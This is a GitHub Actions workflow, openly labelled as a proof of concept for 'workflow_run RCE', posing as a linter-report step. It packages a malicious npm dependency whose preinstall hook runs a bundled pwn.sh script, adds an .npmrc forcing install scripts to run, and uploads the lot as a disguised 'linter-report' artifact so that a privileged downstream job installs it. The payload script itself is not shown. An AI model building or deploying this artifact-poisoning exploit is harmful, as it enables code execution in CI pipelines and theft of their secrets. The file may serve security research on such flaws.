---
name: PR validation
on:
  pull_request:
    branches: [main]

jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Attacker-authored artifact
        run: |
          echo "attacker-controlled linter report (workflow_run RCE, lazyhacker6)" > linter-report.txt
          echo "${{ github.event.pull_request.number }}" > pr-number.txt
          mkdir -p evilpkg/package
          cp tools/poc/pwn.sh evilpkg/package/pwn.sh
          chmod +x evilpkg/package/pwn.sh
          cat > evilpkg/package/package.json <<'PKG'
          {
            "name": "evil-dep",
            "version": "1.0.0",
            "scripts": { "preinstall": "bash pwn.sh" }
          }
          PKG
          (cd evilpkg && tar czf ../evil.tgz package)
          cat > package.json <<'PKG'
          {
            "name": "poc-root",
            "version": "1.0.0",
            "private": true,
            "dependencies": { "evil-dep": "file:./evil.tgz" }
          }
          PKG
          printf 'foreground-scripts=true\n' > .npmrc

      - uses: actions/upload-artifact@v4
        with:
          name: linter-report
          path: |
            linter-report.txt
            pr-number.txt
            package.json
            evil.tgz
            .npmrc
          include-hidden-files: true
